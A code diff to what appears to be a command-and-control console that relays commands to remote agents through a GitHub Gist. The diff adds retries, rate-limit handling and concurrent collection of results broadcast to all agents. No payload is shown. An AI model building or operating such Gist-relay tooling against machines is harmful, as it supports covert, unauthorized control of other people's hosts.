@@ -32,6 +32,7 @@ File transfer:
 """
 
 import os, sys, json, time, uuid, socket, textwrap
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
 from datetime import datetime, timezone
 
@@ -51,6 +52,74 @@ def _safe_import_config():
 
 GIST_API = 'https://api.github.com/gists'
 
+def _current_poll_interval() -> int:
+    cfg = _safe_import_config()
+    try:
+        return max(1, int(cfg.get('POLL_INTERVAL', 5)))
+    except (TypeError, ValueError):
+        return 5
+
+def _format_gist_error(response: requests.Response) -> str:
+    status = response.status_code
+    if status == 401:
+        return 'GitHub rejected the token for this Gist (401 Unauthorized). Check GITHUB_TOKEN in config.py.'
+
+    if status == 429:
+        retry_after = response.headers.get('Retry-After', 'unknown')
+        return f'GitHub API rate limit hit (429 Too Many Requests). Retry after {retry_after}s.'
+
+    if status == 403:
+        remaining = response.headers.get('X-RateLimit-Remaining')
+        reset_at = response.headers.get('X-RateLimit-Reset')
+        body = response.text[:200].lower()
+        if remaining == '0' or 'rate limit' in body:
+            if reset_at and reset_at.isdigit():
+                wait_seconds = max(0, int(reset_at) - int(time.time()))
+                return f'GitHub API rate limit hit (403 Forbidden). Limit resets in about {wait_seconds}s.'
+            return 'GitHub API rate limit hit (403 Forbidden). Wait a bit and retry.'
+        return 'GitHub denied access to the Gist (403 Forbidden). Confirm the token has gist scope and can access this Gist.'
+
+    return f'GitHub Gist request failed: HTTP {status}.'
+
+def _request_gist(method: str, gist_id: str, *, headers: dict, params: dict = None, json_body: dict = None, timeout: int = 15):
+    url = f'{GIST_API}/{gist_id}'
+    backoff = 1
+    last_error = None
+
+    for attempt in range(1, 4):
+        try:
+            response = requests.request(
+                method,
+                url,
+                headers=headers,
+                params=params,
+                json=json_body,
+                timeout=timeout,
+            )
+
+            if response.status_code in (401, 403, 429):
+                raise RuntimeError(_format_gist_error(response))
+
+            if response.status_code in (408, 500, 502, 503, 504):
+                last_error = RuntimeError(f'Temporary GitHub Gist error: HTTP {response.status_code}.')
+            else:
+                response.raise_for_status()
+                return response
+        except requests.RequestException as exc:
+            last_error = exc
+        except RuntimeError:
+            raise
+
+        if attempt < 3:
+            time.sleep(backoff)
+            backoff *= 2
+
+    if isinstance(last_error, requests.RequestException):
+        raise RuntimeError(f'GitHub Gist request failed after 3 attempts: {last_error}') from last_error
+    if last_error is not None:
+        raise last_error
+    raise RuntimeError('GitHub Gist request failed after 3 attempts.')
+
 def _gh_headers(cfg: dict = None) -> dict:
     if cfg is None:
         cfg = _safe_import_config()
@@ -63,20 +132,26 @@ def _gh_headers(cfg: dict = None) -> dict:
 
 def gist_read() -> dict:
     cfg = _safe_import_config()
-    r = requests.get(
-        f'{GIST_API}/{cfg["GIST_ID"]}',
+    r = _request_gist(
+        'GET',
+        cfg['GIST_ID'],
         headers=_gh_headers(cfg),
         params={'_t': int(time.time())},
         timeout=15,
     )
-    r.raise_for_status()
     files = r.json().get('files', {})
     return {k: (v.get('content') or '') for k, v in files.items()}
 
 def gist_patch(files: dict):
     cfg = _safe_import_config()
     payload = {'files': {k: {'content': v if v and v.strip() else '-'} for k, v in files.items()}}
-    requests.patch(f'{GIST_API}/{cfg["GIST_ID"]}', headers=_gh_headers(cfg), json=payload, timeout=15)
+    _request_gist(
+        'PATCH',
+        cfg['GIST_ID'],
+        headers=_gh_headers(cfg),
+        json_body=payload,
+        timeout=15,
+    )
 
 def list_clients(files: dict) -> list:
     clients = []
@@ -110,7 +185,7 @@ def get_results(files: dict) -> list:
                 out.append((hostname, {'type': 'raw', 'output': content}))
     return out
 
-def wait_for_result(hostname: str, cmd_id: str, timeout: int = 300) -> dict | None:
+def wait_for_result(hostname: str, cmd_id: str, timeout: int = 300, show_progress: bool = True) -> dict | None:
     deadline  = time.time() + timeout
     ack_shown = False
     try:
@@ -118,33 +193,49 @@ def wait_for_result(hostname: str, cmd_id: str, timeout: int = 300) -> dict | No
     except Exception:
         baseline = ''
     last_raw = baseline
-    print(f'  [waiting for result from {hostname}...]', end='', flush=True)
+    if show_progress:
+        print(f'  [waiting for result from {hostname}...]', end='', flush=True)
     while time.time() < deadline:
-        time.sleep(POLL_INTERVAL)
-        files2 = gist_read()
+        time.sleep(_current_poll_interval())
+        try:
+            files2 = gist_read()
+        except Exception:
+            if show_progress:
+                print('!', end='', flush=True)
+            continue
         raw    = files2.get(f'res_{hostname}', '').strip()
         if not raw or raw in (' ', '-'):
-            print('.', end='', flush=True); continue
+            if show_progress:
+                print('.', end='', flush=True)
+            continue
         if raw == last_raw:
-            print('.', end='', flush=True); continue
+            if show_progress:
+                print('.', end='', flush=True)
+            continue
         last_raw = raw
         try:
             result = json.loads(raw)
             rtype  = result.get('type', '')
             res_id = result.get('id', '')
             if res_id and res_id != cmd_id:
-                print('.', end='', flush=True); continue
+                if show_progress:
+                    print('.', end='', flush=True)
+                continue
             if rtype == 'ack':
                 if not ack_shown:
-                    print(f'\n  [ACK] client received command processing...', end='', flush=True)
+                    if show_progress:
+                        print(f'\n  [ACK] client received command processing...', end='', flush=True)
                     ack_shown = True
                 continue
-            print()
+            if show_progress:
+                print()
             return result
         except json.JSONDecodeError:
             pass
-        print('.', end='', flush=True)
-    print(f'\n  [timeout] No response within {timeout}s agent offline? Try: results')
+        if show_progress:
+            print('.', end='', flush=True)
+    if show_progress:
+        print(f'\n  [timeout] No response within {timeout}s agent offline? Try: results')
 
 def upload_to_gofile(local_path: str) -> str:
     print(f'  [gofile] fetching upload server...')
@@ -576,14 +667,24 @@ def run():
                     clients = list_clients(files)
                     if not clients:
                         print('  No agents online.')
+                        continue
                     cmd_ids = {}
                     for h, _ in clients:
                         cmd_ids[h] = send_command(h, prompt, files)
-                    for h, _ in clients:
-                        result = wait_for_result(h, cmd_ids[h], timeout=300)
-                        if result:
-                            print_result(h, result)
-                            seen_result_ids.add(result.get('id', ''))
+                    print(f'  [waiting concurrently for {len(cmd_ids)} agents...]')
+                    with ThreadPoolExecutor(max_workers=len(cmd_ids)) as executor:
+                        futures = {
+                            executor.submit(wait_for_result, h, cmd_ids[h], 300, False): h
+                            for h in cmd_ids
+                        }
+                        for future in as_completed(futures):
+                            h = futures[future]
+                            result = future.result()
+                            if result:
+                                print_result(h, result)
+                                seen_result_ids.add(result.get('id', ''))
+                            else:
+                                print(f'  [timeout] {h} did not return a result within 300s.')
                 else:
                     hostname = target.lstrip('@')
                     cmd_id   = send_command(hostname, prompt, files)
